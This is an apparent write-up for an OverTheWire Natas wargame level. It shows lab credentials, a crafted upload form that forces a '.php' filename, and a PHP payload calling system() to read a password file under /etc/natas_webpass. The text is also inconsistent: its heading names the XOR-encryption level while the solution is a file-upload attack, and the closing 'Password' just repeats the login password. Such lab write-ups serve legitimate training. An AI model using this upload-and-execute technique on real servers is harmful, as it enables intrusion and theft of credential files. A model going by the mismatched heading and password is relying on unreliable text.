# [Level 11 to 12](https://overthewire.org/wargames/natas/natas12.html) - XOR encryption

- Login
```
URL: http://natas12.natas.labs.overthewire.org
Username: natas12
Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
```
- Exercise:
![image](https://github.com/user-attachments/assets/bc198088-c94a-4f8c-9bc0-617bda87fc74)
![image](https://github.com/user-attachments/assets/b98e4e20-afb9-40de-93e8-8192a2cad313)

- Background:
- Solution:
  - Save the following as file `natas12_form.html`: 
  ```html
  <html>
  <form enctype="multipart/form-data" action="http://natas12.natas.labs.overthewire.org/index.php" method="POST">
  <input type="hidden" name="MAX_FILE_SIZE" value="1000" />
  <input type="hidden" name="filename" value="natas12_getpass.php" />
  Choose a JPEG to upload (max 1KB):<br/>
  <input name="uploadedfile" type="file" /><br />
  <input type="submit" value="Upload File" />
  </form>
  </body>
  </html>
  ```
  - Save the following as file `natas12_getpass.php` and load it into `natas12_form.html`:
  ```php
  <?php
  system("cat /etc/natas_webpass/natas13")
  ?>
  ```
- Password: `yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB`
